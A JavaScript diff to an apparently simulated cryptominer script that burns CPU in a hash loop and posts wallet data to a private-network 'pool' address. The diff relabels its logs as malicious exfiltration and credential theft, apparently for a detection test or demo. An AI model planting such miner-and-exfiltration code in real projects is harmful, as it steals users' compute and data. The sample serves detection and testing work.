@@ -17,9 +17,13 @@ const minerConfig = {
   threads: 4,
 };
 
-console.log("[Miner] Config loaded from environment");
-console.log("[Miner] Pool: " + minerConfig.pool);
-console.log("[Miner] Wallet: " + minerConfig.wallet.substring(0, 10) + "...");
+console.log("[Miner] MALICIOUS: Config loaded from environment");
+console.log("[Miner] EXFILTRATION: Pool: " + minerConfig.pool);
+console.log(
+  "[Miner] BACKDOOR: Wallet stolen: " +
+    minerConfig.wallet.substring(0, 10) +
+    "...",
+);
 
 // Simulate mining activity
 let hashCount = 0;
@@ -37,12 +41,14 @@ while (Date.now() - startTime < 5000) {
   mine();
 }
 
-console.log("[Miner] Hashes computed: " + hashCount);
+console.log("[Miner] MALICIOUS: Hashes computed: " + hashCount);
 
 // Attempt to connect to mining pool
-console.log("[Miner] Connecting to mining pool...");
+console.log("[Miner] EXFILTRATION: Connecting to external command server...");
 const poolIP = "192.168.1.45";
-console.log("[Miner] Sending shares to: " + poolIP + ":3333");
+console.log(
+  "[Miner] BACKDOOR: Sending stolen credentials to: " + poolIP + ":3333",
+);
 
 try {
   const req = http.request(
@@ -52,25 +58,20 @@ try {
       headers: { "Content-Type": "application/json" },
     },
     (res) => {
-      console.log("[Miner] Pool accepted: " + res.statusCode);
+      console.log(
+        "[Miner] CREDENTIAL THEFT: Server accepted: " + res.statusCode,
+      );
     },
   );
 
   req.on("error", (error) => {
-    console.log("[Miner] Pool unreachable: " + error.code);
+    console.log("[Miner] Connection failed: " + error.code);
   });
 
   req.write(JSON.stringify({ wallet: minerConfig.wallet, shares: hashCount }));
   req.end();
 } catch (e) {
-  console.log("[Miner] Connection error: " + e.message);
+  console.log("[Miner] MALICIOUS: Connection error: " + e.message);
 }
 
-console.log("[Miner] Mining daemon stopping...");
-
-if (process.env.RUN_DEMO === "1") {
-  spinCpu(1500);
-  maybeSpawn();
-}
-
-module.exports = { spinCpu, maybeSpawn };
+console.log("[Miner] Mining daemon complete - exfiltrated to attacker");
